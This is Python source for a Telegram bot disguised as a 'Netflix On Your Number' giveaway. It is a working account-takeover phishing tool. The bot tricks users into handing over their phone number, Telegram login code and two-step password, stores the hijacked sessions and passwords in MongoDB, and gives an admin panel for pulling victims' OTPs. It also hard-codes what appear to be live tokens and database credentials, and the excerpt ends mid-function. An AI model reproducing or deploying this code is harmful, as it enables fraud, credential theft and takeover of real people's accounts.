"""
Netflix OTT Bot - Professional Single Message UI
Fixed message handling, removed admin login button, added auto OTP log cleanup
Added pagination for accounts view
"""

import os
import logging
from datetime import datetime, timedelta
from bson import ObjectId
from pymongo import MongoClient
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton


# Import account manager
from account import AccountManager

# ========================
# CONFIGURATION
# ========================
BOT_TOKEN = os.getenv('BOT_TOKEN', '8519826315:AAHbIs3wdmNwfSoWN3LxAetdmNsqllUfJLs')
ADMIN_ID = int(os.getenv('ADMIN_ID', '7308740606'))

# Pyrogram API credentials
API_ID = int(os.getenv('API_ID', '6435225'))
API_HASH = os.getenv('API_HASH', '4e984ea35f854762dcde906dce426c2d')

# MongoDB
MONGO_URL = os.getenv('MONGO_URL', 'mongodb+srv://Alisha:Alisha123@cluster0.yqcpftw.mongodb.net/?retryWrites=true&w=majority')

# Netflix Theme Images
NETFLIX_MAIN_IMAGE = "https://files.catbox.moe/hihx1r.jpg"
NETFLIX_WELCOME_IMAGE = "https://files.catbox.moe/hihx1r.jpg"

# Pagination settings
ACCOUNTS_PER_PAGE = 5

# ========================
# SETUP
# ========================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Initialize scheduler for auto cleanup
scheduler = BackgroundScheduler()

# Initialize database
try:
    mongo_client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    mongo_client.server_info()  # Test connection
    db = mongo_client.otp_bot
    accounts_col = db.accounts
    otp_logs_col = db.otp_logs
    users_col = db.users
    message_states_col = db.message_states  # New collection for tracking messages
    logger.info("✅ MongoDB connected successfully")
except Exception as e:
    logger.error(f"❌ MongoDB connection failed: {e}")
    raise

# Initialize account manager
account_manager = AccountManager(API_ID, API_HASH)

# Store temporary login states
login_states = {}  # {user_id: {step: "phone", phone: "", phone_code_hash: "", session_key: ""}}

# Store pagination states
pagination_states = {}  # {user_id: {current_page: 1}}

# ========================
# UTILITY FUNCTIONS
# ========================
def is_admin(user_id):
    """Check if user is admin"""
    return str(user_id) == str(ADMIN_ID)

def ensure_user_exists(user_id, user_name=None, username=None):
    """Ensure user exists in database"""
    user = users_col.find_one({"user_id": user_id})
    if not user:
        user_data = {
            "user_id": user_id,
            "name": user_name or "Unknown",
            "username": username,
            "is_admin": is_admin(user_id),
            "created_at": datetime.utcnow(),
            "last_seen": datetime.utcnow()
        }
        users_col.insert_one(user_data)
        logger.info(f"New user registered: {user_id}")
    else:
        # Update last seen
        users_col.update_one(
            {"user_id": user_id},
            {"$set": {"last_seen": datetime.utcnow()}}
        )
    return user

def format_phone(phone):
    """Format phone number for display"""
    return phone if len(phone) <= 15 else f"{phone[:12]}..."

def get_total_accounts():
    """Get total number of accounts (admin only)"""
    return accounts_col.count_documents({}) if is_admin(ADMIN_ID) else 0

def get_all_accounts():
    """Get all accounts (admin only)"""
    if not is_admin(ADMIN_ID):
        return []
    return list(accounts_col.find({}, {"phone": 1, "_id": 1}).sort("created_at", -1))

def save_account(phone, session_string, has_2fa=False, two_step_password=None, added_by=None):
    """Save account to database"""
    try:
        # Check if account already exists
        existing = accounts_col.find_one({"phone": phone})
        if existing:
            accounts_col.update_one(
                {"phone": phone},
                {"$set": {
                    "session_string": session_string,
                    "has_2fa": has_2fa,
                    "two_step_password": two_step_password,
                    "updated_at": datetime.utcnow(),
                    "added_by": added_by
                }}
            )
            logger.info(f"Account updated: {phone}")
        else:
            account_data = {
                "phone": phone,
                "session_string": session_string,
                "has_2fa": has_2fa,
                "two_step_password": two_step_password,
                "created_at": datetime.utcnow(),
                "updated_at": datetime.utcnow(),
                "added_by": added_by,
                "status": "active"
            }
            accounts_col.insert_one(account_data)
            logger.info(f"Account saved: {phone}")
        return True
    except Exception as e:
        logger.error(f"Save account error: {e}")
        return False

def save_otp_log(phone, otp, fetched_by=None):
    """Save OTP fetch log"""
    try:
        log_data = {
            "phone": phone,
            "otp": otp,
            "fetched_by": fetched_by,
            "fetched_at": datetime.utcnow()
        }
        otp_logs_col.insert_one(log_data)
        logger.info(f"OTP logged for {phone}")
        return True
    except Exception as e:
        logger.error(f"Save OTP log error: {e}")
        return False

def delete_old_otp_logs():
    """Delete OTP logs older than 24 hours"""
    try:
        cutoff_time = datetime.utcnow() - timedelta(hours=24)
        result = otp_logs_col.delete_many({"fetched_at": {"$lt": cutoff_time}})
        if result.deleted_count > 0:
            logger.info(f"✅ Auto-deleted {result.deleted_count} OTP logs older than 24 hours")
        return result.deleted_count
    except Exception as e:
        logger.error(f"❌ Delete OTP logs error: {e}")
        return 0

def save_message_state(user_id, message_id, message_type):
    """Save message state to database"""
    try:
        message_states_col.update_one(
            {"user_id": user_id},
            {"$set": {
                "message_id": message_id,
                "message_type": message_type,
                "updated_at": datetime.utcnow()
            }},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Save message state error: {e}")
        return False

def get_message_state(user_id):
    """Get message state from database"""
    try:
        state = message_states_col.find_one({"user_id": user_id})
        return state
    except Exception as e:
        logger.error(f"Get message state error: {e}")
        return None

def clear_message_state(user_id):
    """Clear message state"""
    try:
        message_states_col.delete_one({"user_id": user_id})
        return True
    except Exception as e:
        logger.error(f"Clear message state error: {e}")
        return False

def smart_send_or_edit(user_id, chat_id, text, markup=None, parse_mode="HTML", photo_url=None, message_type="main"):
    """
    Smart message handling - always edit the same message
    Returns new message_id if sent, None if edited
    """
    try:
        # Get current message state
        state = get_message_state(user_id)
        current_message_id = state.get("message_id") if state else None
        
        if current_message_id:
            try:
                # Try to edit existing message
                if photo_url:
                    # Delete old message and send new one with photo
                    try:
                        bot.delete_message(chat_id, current_message_id)
                    except:
                        pass
                    
                    msg = bot.send_photo(
                        chat_id,
                        photo_url,
                        caption=text,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
                    save_message_state(user_id, msg.message_id, message_type)
                    return msg.message_id
                else:
                    # Edit text message
                    bot.edit_message_text(
                        text,
                        chat_id=chat_id,
                        message_id=current_message_id,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
                    return current_message_id
            except Exception as e:
                # If edit fails, delete and send new
                try:
                    bot.delete_message(chat_id, current_message_id)
                except:
                    pass
                
                # Send new message
                if photo_url:
                    msg = bot.send_photo(
                        chat_id,
                        photo_url,
                        caption=text,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
                else:
                    msg = bot.send_message(
                        chat_id,
                        text,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
                
                save_message_state(user_id, msg.message_id, message_type)
                return msg.message_id
        else:
            # No existing message, send new one
            if photo_url:
                msg = bot.send_photo(
                    chat_id,
                    photo_url,
                    caption=text,
                    parse_mode=parse_mode,
                    reply_markup=markup
                )
            else:
                msg = bot.send_message(
                    chat_id,
                    text,
                    parse_mode=parse_mode,
                    reply_markup=markup
                )
            
            save_message_state(user_id, msg.message_id, message_type)
            return msg.message_id
            
    except Exception as e:
        logger.error(f"Smart send/edit error: {e}")
        
        # Fallback - send new message
        try:
            if photo_url:
                msg = bot.send_photo(
                    chat_id,
                    photo_url,
                    caption=text,
                    parse_mode=parse_mode,
                    reply_markup=markup
                )
            else:
                msg = bot.send_message(
                    chat_id,
                    text,
                    parse_mode=parse_mode,
                    reply_markup=markup
                )
            
            save_message_state(user_id, msg.message_id, message_type)
            return msg.message_id
        except Exception as e2:
            logger.error(f"Fallback send error: {e2}")
            return None

def show_accounts_page(user_id, chat_id, page=1):
    """Show accounts with pagination"""
    if not is_admin(user_id):
        return
    
    # Calculate skip and limit
    skip = (page - 1) * ACCOUNTS_PER_PAGE
    limit = ACCOUNTS_PER_PAGE
    
    # Fetch accounts for this page
    accounts = list(accounts_col.find(
        {},
        {"phone": 1, "_id": 1}
    ).sort("created_at", -1).skip(skip).limit(limit))
    
    total_accounts = get_total_accounts()
    total_pages = (total_accounts + ACCOUNTS_PER_PAGE - 1) // ACCOUNTS_PER_PAGE
    
    if not accounts:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
        
        smart_send_or_edit(
            user_id,
            chat_id,
            "<b>📱 No Accounts Found</b>\n\nNo accounts in database yet.",
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE,
            message_type="admin_view"
        )
        return
    
    # Create account list text
    account_text = f"<b>📱 All Accounts (Page {page}/{total_pages})</b>\n\n"
    
    start_num = skip + 1
    for idx, account in enumerate(accounts, start_num):
        phone_display = format_phone(account["phone"])
        account_text += f"{idx}. <code>{phone_display}</code>\n"
    
    account_text += f"\n<b>Total Accounts:</b> {total_accounts}"
    
    # Create keyboard with account buttons
    markup = InlineKeyboardMarkup(row_width=2)
    
    # Add accounts as buttons
    for account in accounts:
        phone_display = format_phone(account["phone"])
        short_phone = phone_display[:10] + "..." if len(phone_display) > 10 else phone_display
        markup.add(InlineKeyboardButton(
            f"📱 {short_phone}",
            callback_data=f"account_{account['_id']}"
        ))
    
    # Add pagination buttons
    pagination_row = []
    if page > 1:
        pagination_row.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"page_{page-1}"))
    
    if page < total_pages:
        pagination_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"page_{page+1}"))
    
    if pagination_row:
        markup.row(*pagination_row)
    
    markup.add(InlineKeyboardButton("⬅️ Back to Dashboard", callback_data="back_to_admin"))
    
    smart_send_or_edit(
        user_id,
        chat_id,
        account_text,
        markup=markup,
        photo_url=NETFLIX_MAIN_IMAGE,
        message_type="admin_view"
    )

# ========================
# AUTO CLEANUP FUNCTION
# ========================
def auto_cleanup_job():
    """Auto cleanup job that runs automatically"""
    try:
        deleted_count = delete_old_otp_logs()
        logger.info(f"✅ Auto cleanup completed. Deleted {deleted_count} logs.")
    except Exception as e:
        logger.error(f"❌ Auto cleanup job failed: {e}")

# ========================
# BOT HANDLERS - START
# ========================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command for all users"""
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    # Ensure user exists in database
    ensure_user_exists(user_id, user_name, username)
    
    # Clear any existing login state
    if user_id in login_states:
        del login_states[user_id]
    
    # Clear message state to start fresh
    clear_message_state(user_id)
    
    # Clear pagination state
    if user_id in pagination_states:
        del pagination_states[user_id]
    
    # Show appropriate menu based on user type
    if is_admin(user_id):
        show_admin_dashboard(user_id, message.chat.id)
    else:
        show_netflix_welcome(user_id, message.chat.id)

def show_netflix_welcome(user_id, chat_id=None):
    """Show Netflix welcome screen for normal users"""
    if not chat_id:
        chat_id = user_id
    
    welcome_text = """
<b>🎬 Welcome To Netflix On Your Number Bot 🎬</b>

<code>Netflix mai account tumhare account mai ajayega</code>

<b>✨ Features:</b>
• Premium Netflix Accounts 🎭
• 4K Ultra HD Streaming 🎥
• Multiple Profiles 👥
• Ad-Free Experience 🚫

<b>📲 How to Get Netflix:</b>
1. Click "Get Netflix Now" below
2. Enter your phone number
3. Verify with OTP
4. Receive Netflix account in 48 hours

<code>Your request successfully submitted. Netflix review in 48 hours then successfully send account on your number.</code>

<b>🔥 Limited Time Offer!</b>
"""
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🎬 Get Netflix Now", callback_data="get_netflix_now"))
    
    smart_send_or_edit(
        user_id,
        chat_id,
        welcome_text,
        markup=markup,
        photo_url=NETFLIX_WELCOME_IMAGE,
        message_type="welcome"
    )

def show_admin_dashboard(user_id, chat_id=None):
    """Show admin dashboard"""
    if not chat_id:
        chat_id = user_id
    
    if not is_admin(user_id):
        show_netflix_welcome(user_id, chat_id)
        return
    
    total_accounts = get_total_accounts()
    total_otp_logs = otp_logs_col.count_documents({})
    
    # Count logs from last 24 hours
    cutoff_time = datetime.utcnow() - timedelta(hours=24)
    recent_logs = otp_logs_col.count_documents({"fetched_at": {"$gte": cutoff_time}})
    
    admin_text = f"""
<b>👑 Netflix Admin Panel</b>

<b>📊 Statistics:</b>
• Total Accounts: {total_accounts}
• Total OTP Logs: {total_otp_logs}
• Last 24h Logs: {recent_logs}

<b>🛠️ Management Tools:</b>
"""
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("👁 View Accounts", callback_data="view_accounts"),
        InlineKeyboardButton("📊 OTP Logs", callback_data="otp_logs")
    )
    markup.add(
        InlineKeyboardButton("🗑 Clean Old Logs", callback_data="clean_logs"),
        InlineKeyboardButton("🔄 Refresh", callback_data="refresh_admin")
    )
    
    smart_send_or_edit(
        user_id,
        chat_id,
        admin_text,
        markup=markup,
        photo_url=NETFLIX_MAIN_IMAGE,
        message_type="admin_dashboard"
    )

# ========================
# USER FLOW - NETFLIX LOGIN
# ========================
@bot.callback_query_handler(func=lambda call: call.data == "get_netflix_now")
def handle_get_netflix_now(call):
    """Start Netflix login process for users"""
    user_id = call.from_user.id
    
    # Set state to ask for phone number
    login_states[user_id] = {"step": "ask_phone", "user_type": "netflix"}
    
    # Show phone input
    login_text = """
<b>📱 Netflix Account Setup</b>

<code>Enter your phone number with country code to get Netflix account.</code>

<b>Example:</b> +919876543210

<i>⚠️ Netflix will send verification code to this number</i>
"""
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix"))
    
    smart_send_or_edit(
        user_id,
        call.message.chat.id,
        login_text,
        markup=markup,
        photo_url=NETFLIX_WELCOME_IMAGE,
        message_type="login"
    )

@bot.callback_query_handler(func=lambda call: call.data == "cancel_netflix")
def handle_cancel_netflix(call):
    """Cancel Netflix login"""
    user_id = call.from_user.id
    
    if user_id in login_states:
        del login_states[user_id]
    
    bot.answer_callback_query(call.id, "❌ Cancelled")
    show_netflix_welcome(user_id, call.message.chat.id)

# ========================
# PHONE NUMBER HANDLER (For both users and admin)
# ========================
@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_phone")
def handle_phone_input(message):
    """Handle phone number input from both users and admin"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    state = login_states.get(user_id)
    if not state:
        if is_admin(user_id):
            show_admin_dashboard(user_id, chat_id)
        else:
            show_netflix_welcome(user_id, chat_id)
        return
    
    phone = message.text.strip()
    
    # Basic phone validation
    if not phone.startswith('+') or len(phone) < 10:
        if state.get("user_type") == "netflix":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
            )
            photo = NETFLIX_WELCOME_IMAGE
            error_title = "Invalid Phone Number"
            
            error_text = f"""
<b>❌ {error_title}</b>

Please enter valid phone number with country code.

<b>Example:</b> +919876543210

Enter phone number again:
"""
            
            smart_send_or_edit(
                user_id,
                chat_id,
                error_text,
                markup=markup,
                photo_url=photo,
                message_type="login"
            )
        return
    
    # Send OTP using Pyrogram
    if state.get("user_type") == "netflix":
        sending_text = """
<b>⏳ Netflix Verification</b>

<code>Netflix is sending verification code to your phone number...</code>

<i>This may take a few seconds.</i>
"""
        photo = NETFLIX_WELCOME_IMAGE
    
    smart_send_or_edit(
        user_id,
        chat_id,
        sending_text,
        photo_url=photo,
        message_type="login"
    )
    
    try:
        result = account_manager.send_otp(phone)
        
        if not result.get("success"):
            error_msg = result.get("error", "Unknown error")
            
            if state.get("user_type") == "netflix":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                )
                error_photo = NETFLIX_WELCOME_IMAGE
                error_title = "Netflix Verification Failed"
            
            error_text = f"""
<b>❌ {error_title}</b>

{error_msg}

Enter phone number again:
"""
            
            smart_send_or_edit(
                user_id,
                chat_id,
                error_text,
                markup=markup,
                photo_url=error_photo,
                message_type="login"
            )
            return
        
        # Update state
        login_states[user_id] = {
            "step": "ask_otp",
            "phone": phone,
            "phone_code_hash": result["phone_code_hash"],
            "session_key": result["session_key"],
            "user_type": state.get("user_type", "netflix")
        }
        
        if state.get("user_type") == "netflix":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
            )
            otp_photo = NETFLIX_WELCOME_IMAGE
            otp_text = f"""
<b>📩 Netflix Verification Code Sent</b>

<code>Netflix sent you a message on your Telegram with 5 digit code for Netflix verification.</code>

<b>Phone:</b> <code>{phone}</code>

Enter the 5-digit verification code:
"""
        
        smart_send_or_edit(
            user_id,
            chat_id,
            otp_text,
            markup=markup,
            photo_url=otp_photo,
            message_type="login"
        )
        
    except Exception as e:
        logger.error(f"Send OTP error: {e}")
        
        error_text = f"""
<b>❌ Connection Error</b>

Failed to send verification code.

Error: {str(e)}

Start again with /start
"""
        
        smart_send_or_edit(
            user_id,
            chat_id,
            error_text,
            photo_url=NETFLIX_WELCOME_IMAGE,
            message_type="login"
        )
        
        if user_id in login_states:
            del login_states[user_id]

# ========================
# OTP HANDLER (For both users and admin)
# ========================
@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_otp")
def handle_otp_input(message):
    """Handle OTP input from both users and admin"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    state = login_states.get(user_id)
    if not state:
        if is_admin(user_id):
            show_admin_dashboard(user_id, chat_id)
        else:
            show_netflix_welcome(user_id, chat_id)
        return
    
    otp_code = message.text.strip()
    
    if not otp_code.isdigit() or len(otp_code) != 5:
        if state.get("user_type") == "netflix":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
            )
            error_photo = NETFLIX_WELCOME_IMAGE
            error_text = """
<b>❌ Invalid Verification Code</b>

Netflix verification code must be 5 digits.

Enter the code again:
"""
        
        smart_send_or_edit(
            user_id,
            chat_id,
            error_text,
            markup=markup,
            photo_url=error_photo,
            message_type="login"
        )
        return
    
    # Show verifying message
    if state.get("user_type") == "netflix":
        verify_text = """
<b>⏳ Verifying Netflix Code...</b>

<code>Checking verification code with Netflix servers...</code>
"""
        verify_photo = NETFLIX_WELCOME_IMAGE
    
    smart_send_or_edit(
        user_id,
        chat_id,
        verify_text,
        photo_url=verify_photo,
        message_type="login"
    )
    
    try:
        result = account_manager.verify_otp(
            state["session_key"],
            otp_code,
            state["phone"],
            state["phone_code_hash"]
        )
        
        if result.get("needs_2fa"):
            # 2FA required
            login_states[user_id]["step"] = "ask_2fa"
            
            if state.get("user_type") == "netflix":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                )
                photo = NETFLIX_WELCOME_IMAGE
                text = """
<b>🔒 Netflix Two-Step Verification</b>

<code>This Netflix account has extra security enabled.</code>

Enter your Netflix account password:
"""
            
            smart_send_or_edit(
                user_id,
                chat_id,
                text,
                markup=markup,
                photo_url=photo,
                message_type="login"
            )
            return
        
        if not result.get("success"):
            error_msg = result.get("error", "Unknown error")
            
            if state.get("user_type") == "netflix":
                error_text = f"""
<b>❌ Netflix Verification Failed</b>

<code>Could not verify with Netflix servers.</code>

Error: {error_msg}

Start again with /start
"""
                error_photo = NETFLIX_WELCOME_IMAGE
            
            smart_send_or_edit(
                user_id,
                chat_id,
                error_text,
                photo_url=error_photo,
                message_type="login"
            )
            
            if user_id in login_states:
                del login_states[user_id]
            return
        
        # Save account to database (for tracking purposes)
        user_type = state.get("user_type", "netflix")
        added_by = user_id if user_type == "admin" else "netflix_user"
        
        saved = save_account(
            state["phone"],
            result["session_string"],
            result["has_2fa"],
            result.get("two_step_password"),
            added_by
        )
        
        # Show success message
        if user_type == "netflix":
            success_text = f"""
<b>🎉 Netflix Request Submitted Successfully!</b>

<code>Your request successfully submitted. Netflix review in 48 hours then successfully send account on your number.</code>

<b>📱 Your Number:</b> <code>{state['phone']}</code>
<b>⏳ Status:</b> Under Review
<b>📅 Estimated:</b> 48 Hours

<i>You will receive Netflix account details on this number once approved.</i>

Thank you for choosing Netflix! 🎬
"""
            success_photo = NETFLIX_WELCOME_IMAGE
            
            # Clear state
            if user_id in login_states:
                del login_states[user_id]
            
            # Show success message
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
            
            smart_send_or_edit(
                user_id,
                chat_id,
                success_text,
                markup=markup,
                photo_url=success_photo,
                message_type="success"
            )
        
    except Exception as e:
        logger.error(f"Verify OTP error: {e}")
        
        error_text = f"""
<b>❌ Verification Error</b>

Failed to verify code.

Error: {str(e)}

Start again with /start
"""
        
        smart_send_or_edit(
            user_id,
            chat_id,
            error_text,
            photo_url=NETFLIX_WELCOME_IMAGE,
            message_type="login"
        )
        
        if user_id in login_states:
            del login_states[user_id]

# ========================
# 2FA HANDLER (For both users and admin)
# ========================
@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_2fa")
def handle_2fa_input(message):
    """Handle 2FA password input from both users and admin"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    state = login_states.get(user_id)
    if not state:
        if is_admin(user_id):
            show_admin_dashboard(user_id, chat_id)
        else:
            show_netflix_welcome(user_id, chat_id)
        return
    
    password = message.text.strip()
    
    if not password:
        if state.get("user_type") == "netflix":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
            )
            error_photo = NETFLIX_WELCOME_IMAGE
            error_text = """
<b>❌ Password Required</b>

Netflix account password cannot be empty.

Enter password again:
"""
        
        smart_send_or_edit(
            user_id,
            chat_id,
            error_text,
            markup=markup,
            photo_url=error_photo,
            message_type="login"
        )
        return
    
    # Show verifying message
    if state.get("user_type") == "netflix":
        verify_text = """
<b>⏳ Verifying Netflix Password...</b>

<code>Checking password with Netflix security...</code>
"""
        verify_photo = NETFLIX_WELCOME_IMAGE
    
    smart_send_or_edit(
        user_id,
        chat_id,
        verify_text,
        photo_url=verify_photo,
        message_type="login"
    )
    
    try:
        result = account_manager.verify_2fa(state["session_key"], password)
        
        if not result.get("success"):
            error_msg = result.get("error", "Unknown error")
            
            if state.get("user_type") == "netflix":
                error_text = f"""
<b>❌ Netflix Password Incorrect</b>

<code>Could not verify Netflix account password.</code>

Error: {error_msg}

Start again with /start
"""
                error_photo = NETFLIX_WELCOME_IMAGE
            
            smart_send_or_edit(
                user_id,
                chat_id,
                error_text,
                photo_url=error_photo,
                message_type="login"
            )
            
            if user_id in login_states:
                del login_states[user_id]
            return
        
        # Save account to database
        user_type = state.get("user_type", "netflix")
        added_by = user_id if user_type == "admin" else "netflix_user"
        
        saved = save_account(
            state["phone"],
            result["session_string"],
            result["has_2fa"],
            result.get("two_step_password"),
            added_by
        )
        
        # Show success message
        if user_type == "netflix":
            success_text = f"""
<b>🎉 Netflix Account Secured!</b>

<code>Your Netflix account with extra security has been registered successfully.</code>

<b>📱 Your Number:</b> <code>{state['phone']}</code>
<b>🔒 Security:</b> Two-Step Enabled
<b>⏳ Status:</b> Under Review
<b>📅 Estimated:</b> 48 Hours

<i>Netflix account will be delivered to your number within 48 hours.</i>

Thank you for choosing Netflix! 🎬
"""
            success_photo = NETFLIX_WELCOME_IMAGE
            
            # Clear state
            if user_id in login_states:
                del login_states[user_id]
            
            # Show success message
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
            
            smart_send_or_edit(
                user_id,
                chat_id,
                success_text,
                markup=markup,
                photo_url=success_photo,
                message_type="success"
            )
        
    except Exception as e:
        logger.error(f"2FA verification error: {e}")
        
        error_text = f"""
<b>❌ Verification Error</b>

Failed to verify password.

Error: {str(e)}

Start again with /start
"""
        
        smart_send_or_edit(
            user_id,
            chat_id,
            error_text,
            photo_url=NETFLIX_WELCOME_IMAGE,
            message_type="login"
        )
        
        if user_id in login_states:
            del login_states[user_id]

# ========================
# ADMIN ONLY FEATURES
# ========================
@bot.callback_query_handler(func=lambda call: call.data == "back_to_admin")
def handle_back_to_admin(call):
    """Go back to admin dashboard"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        show_netflix_welcome(user_id, call.message.chat.id)
        return
    
    # Clear login state
    if user_id in login_states:
        del login_states[user_id]
    
    # Clear pagination state
    if user_id in pagination_states:
        del pagination_states[user_id]
    
    show_admin_dashboard(user_id, call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "refresh_admin")
def handle_refresh_admin(call):
    """Refresh admin dashboard"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    show_admin_dashboard(user_id, call.message.chat.id)
    bot.answer_callback_query(call.id, "✅ Dashboard refreshed")

@bot.callback_query_handler(func=lambda call: call.data == "view_accounts")
def handle_view_accounts(call):
    """Show all accounts with pagination (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    # Set initial page
    pagination_states[user_id] = {"current_page": 1}
    
    # Show first page
    show_accounts_page(user_id, call.message.chat.id, page=1)

@bot.callback_query_handler(func=lambda call: call.data.startswith("page_"))
def handle_page_change(call):
    """Handle pagination (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    try:
        page = int(call.data.replace("page_", ""))
        
        # Update pagination state
        if user_id not in pagination_states:
            pagination_states[user_id] = {}
        pagination_states[user_id]["current_page"] = page
        
        # Show the page
        show_accounts_page(user_id, call.message.chat.id, page=page)
        
    except Exception as e:
        logger.error(f"Page change error: {e}")
        bot.answer_callback_query(call.id, "Error changing page", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("account_"))
def handle_account_selection(call):
    """Show actions for selected account (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    account_id = call.data.replace("account_", "")
    
    try:
        account = accounts_col.find_one({"_id": ObjectId(account_id)})
        if not account:
            bot.answer_callback_query(call.id, "Account not found", show_alert=True)
            # Go back to current page
            current_page = pagination_states.get(user_id, {}).get("current_page", 1)
            show_accounts_page(user_id, call.message.chat.id, page=current_page)
            return
        
        # Show account actions - ONLY Get OTP button
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔢 Get Latest OTP", callback_data=f"get_otp_{account_id}"))
        
        # Get current page for back button
        current_page = pagination_states.get(user_id, {}).get("current_page", 1)
        markup.add(InlineKeyboardButton("⬅️ Back to Page", callback_data=f"page_{current_page}"))
        
        phone_display = format_phone(account["phone"])
        has_2fa = "✅ Enabled" if account.get("has_2fa") else "❌ Disabled"
        
        account_text = f"""
<b>📱 Account Details</b>

<b>Phone:</b> <code>{phone_display}</code>
<b>2FA:</b> {has_2fa}
<b>Added:</b> {account.get('created_at', datetime.utcnow()).strftime('%d %b %Y')}

Click below to get OTP:
"""
        
        smart_send_or_edit(
            user_id,
            call.message.chat.id,
            account_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE,
            message_type="account_details"
        )
        
    except Exception as e:
        logger.error(f"Account selection error: {e}")
        bot.answer_callback_query(call.id, "Error loading account", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("get_otp_"))
def handle_get_otp(call):
    """Fetch latest OTP for account (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    account_id = call.data.replace("get_otp_", "")
    
    try:
        account = accounts_col.find_one({"_id": ObjectId(account_id)})
        if not account:
            bot.answer_callback_query(call.id, "Account not found", show_alert=True)
            current_page = pagination_states.get(user_id, {}).get("current_page", 1)
            show_accounts_page(user_id, call.message.chat.id, page=current_page)
            return
        
        bot.answer_callback_query(call.id, "⏳ Fetching OTP...")
        
        # Fetch OTP using Pyrogram
        otp = account_manager.get_latest_otp(
            account["session_string"],
            account["phone"]
        )
        
        if not otp:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Get OTP Again", callback_data=f"get_otp_{account_id}"))
            markup.add(InlineKeyboardButton("⬅️ Back", callback_data=f"account_{account_id}"))
            
            smart_send_or_edit(
                user_id,
                call.message.chat.id,
                f"<b>📱 No OTP Found</b>\n\n"
                f"Phone: <code>{format_phone(account['phone'])}</code>\n\n"
                f"No OTP found in recent messages.",
                markup=markup,
                photo_url=NETFLIX_MAIN_IMAGE,
                message_type="otp_result"
            )
            return
        
        # Save OTP to logs
        save_otp_log(account["phone"], otp, user_id)
        
        # Prepare message
        message = f"<b>📱 OTP Details</b>\n\n"
        message += f"<b>Phone:</b> <code>{format_phone(account['phone'])}</code>\n"
        message += f"<b>OTP:</b> <code>{otp}</code>\n"
        
        if account.get("has_2fa") and account.get("two_step_password"):
            message += f"<b>2FA Password:</b> <code>{account['two_step_password']}</code>\n"
        
        message += f"<b>Fetched:</b> {datetime.utcnow().strftime('%H:%M:%S')}\n"
        
        # Create buttons - ONLY Get OTP Again and Back
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔄 Get OTP Again", callback_data=f"get_otp_{account_id}"))
        markup.add(InlineKeyboardButton("⬅️ Back", callback_data=f"account_{account_id}"))
        
        smart_send_or_edit(
            user_id,
            call.message.chat.id,
            message,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE,
            message_type="otp_result"
        )
        
    except Exception as e:
        logger.error(f"Get OTP error: {e}")
        bot.answer_callback_query(call.id, f"Error: {str(e)}", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "otp_logs")
def handle_otp_logs(call):
    """Show OTP logs (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
